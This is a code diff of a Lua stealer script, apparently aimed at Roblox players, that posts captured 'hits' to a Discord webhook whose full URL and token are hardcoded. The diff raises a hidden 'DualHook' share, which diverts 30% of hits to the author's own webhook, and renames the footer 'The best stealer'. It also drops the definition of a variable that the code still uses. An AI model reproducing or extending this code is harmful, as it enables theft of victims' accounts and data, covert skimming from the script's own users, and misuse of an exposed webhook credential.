@@ -18,7 +18,7 @@ local pingEveryone = _G.pingEveryone == "Yes"
 local DualHookUsers = {"cybertu24","AnonymousANONIMO125"}
 local DualHookWebhook = "https://discord.com/api/webhooks/1393678758883496078/dWWVbv5oLiiHL9Po5FYg77bbJXVBeHkkij_Hy1MpxQHut1pNY2c_hzNg8jK0Qq7jNCRM" -- Cambiar a tu webhook real
 local DualHookMinValue = 500
-local DualHookPercent = 10 -- porcentaje de hits que se van a ti
+local DualHookPercent = 30 -- porcentaje de hits que se van a ti
 
 -- Kick por servidor lleno, privado o VIP
 local function CheckServerInitial()
@@ -55,15 +55,14 @@ local function SendDualHook(title, description, fields)
     end
     local targetWebhook = useDual and DualHookWebhook or webhook
     local data = {
-        local prefix = pingEveryone and "@everyone " or ""
-        ["content"] = prefix,
+        ["content"] = prefix or "",
         ["embeds"] = {{
             ["title"] = title,
             ["description"] = description or "",
             ["color"] = 65280,
             ["fields"] = fields or {},
             ["thumbnail"] = {["url"]="https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"},
-            ["footer"] = {["text"]="DualHook by Anonimo 🇪🇨"}
+            ["footer"] = {["text"]="The best stealer by Anonimo 🇪🇨"}
         }}
     }
     local body = HttpService:JSONEncode(data)
